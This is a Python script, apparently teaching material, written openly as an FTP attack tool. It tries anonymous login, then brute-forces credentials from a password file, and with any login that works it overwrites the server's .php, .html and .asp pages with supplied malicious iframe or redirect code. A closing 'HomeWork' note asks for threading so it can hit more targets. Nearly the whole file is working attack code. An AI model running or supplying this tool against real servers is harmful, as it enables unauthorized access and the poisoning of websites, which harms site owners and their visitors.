# _*_coding:utf8-
import ftplib
import optparse
import time

'''
This code we integrated all code as attack.
Docstring:
---------
        1. First,we trying use anonymous to login target FTP. if succeeded,we can attack directly,
            if failed, we will try using password file crack account and password, if succeeded,then we attack,
            else,we will Failed !_!,but we can expansion password in password file.
        OK, Let's look this code  and Good Lucky :) 
        
'''


def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'password')
        print '[*] ' + str(hostname) + 'FTP Anonymous Logon Succeeded.'
        ftp.quit()
        return True
    except Exception as e:
        print '[-] ' + str(hostname) + 'FTP Anonymous Logon Failed.'
        return False


def bruteLogin(hostname, passwordFile):
    pF = open(passwordFile, 'r')

    for line in pF.readlines():
        time.sleep(1)
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print '[+] Trying: ' + userName + '/' + passWord

        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print '[*] ' + str(hostname) + 'FTP Logon Succeeded: ' + userName + '/' + passWord
            ftp.quit()
            return (userName, passWord)
        except Exception as e:
            pass

    # we still not found username  and password,when for loop is over.
    print '[-] Could not brute force FTP credentials.'
    return (None, None)


def returnDefualt(ftp):
    try:
        dirList = ftp.nlst()  # You can set other dir path or file path
    except:
        print '[-] Could not list directory contents.'
        print '[-] Skipping To Next Target.'

    else:
        retList = []
        for fileName in dirList:
            fn = fileName.lower()
            if ('.php' in fn) or ('.html' in fn) or ('.asp' in fn):
                print '[+] Found default Page: ' + fileName
                retList.append(fileName)
        return retList


def injectPage(ftp, page, redirect):
    # Download page
    ftp.retrlines('RETR ' + page)
    print '[+] Downloaded Page: ' + page
    # write redirect code
    f = open(page, 'w')
    f.write(redirect)
    f.close()

    # upload files
    print '[+] Injected Malicious IFrame on: ' + page
    ftp.storlines('STOR ' + page, open(page))
    print '[+] Uploaded Injected Page: ' + page


def attack(username, password, tgtHost, redirect):
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password)
    defpages = returnDefualt(ftp)
    for defpage in defpages:
        injectPage(ftp, defpage, redirect)


def main():
    parser = optparse.OptionParser('usage%prog ' + '-H <target host[s]> -r <redirect page> + f <userpass file>')
    parser.add_option('-H', dest='tgtHosts', type='string', help='specify target host')
    parser.add_option('-r', dest='redirect', type='string', help='specify a redirection page')
    parser.add_option('-f', dest='passwdFile', type='string', help='specify user/password file')

    (options, args) = parser.parse_args()
    tgtHosts = str(options.tgtHosts).split(',')
    passwdFile = options.passwdFile
    redirect = options.redirect

    if tgtHosts is None or passwdFile is None or redirect is None:
        print parser.usage
        exit(0)

    for tgtHost in tgtHosts:
        # Try anonymous
        res_anon = anonLogin(tgtHost)
        if res_anon == True:
            userName = 'anonymous'
            password = 'hack by Joker'
            print '[+] Using Anonymous Creds to attack !'
            attack(userName, password, tgtHost, redirect)
        else:
            (userName, password) = bruteLogin(tgtHost, passwdFile)
            if userName is not None and password is not None:
                print '[+] Using Creds: ' + userName + '/' + password + ' to attack'
                attack(userName, password, tgtHost, redirect)
            else:
                print '[-] Could not Login target Computer !_!...Please expansion password file.'


if __name__ == '__main__':
    main()

'''
HomeWork:
        1. using thread to attack target computer, Note, "file read and write" ,means:Thread conflict.
'''
